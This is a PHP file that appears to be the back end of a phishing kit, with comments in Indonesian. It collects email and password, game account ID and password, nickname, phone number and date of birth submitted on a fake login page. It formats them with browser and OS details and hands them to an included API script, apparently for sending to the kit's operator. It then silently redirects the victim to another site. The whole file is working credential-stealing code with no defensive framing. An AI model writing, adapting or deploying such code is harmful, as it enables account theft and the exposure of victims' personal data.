<?php 
include 'rest/UserAgent.php';
include 'rest/daerah.php';
include 'rest/license.php';
include 'id.php';
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$sandi = $_POST['sandi'];
$nickname = $_POST['nameacc'];
$phone = $_POST['phone'];
$ttl = $_POST['ttl'];


$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];
			    

// KONTEN RESULT AKUN

$msg = "
$sender
===================
Email / ID: $email
Password: $password
Login: $login
===================
ID Login
User ID: $playid
Sandi ID: $sandi
===================
Info Akun
Nickname: $nickname
ID Game: $playid
No. Telp: $phone
TTL: $ttl
Platform: $platform
OS: $osversi
===================
CREDIT BY $author
===================
";

$kirim = $msg;include('rest/api.php');

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='imnoob' method='POST' action='https://www.topbos.com/'>
</form>
<script type='text/javascript'>document.getElementById('imnoob').submit();</script>";
}

?>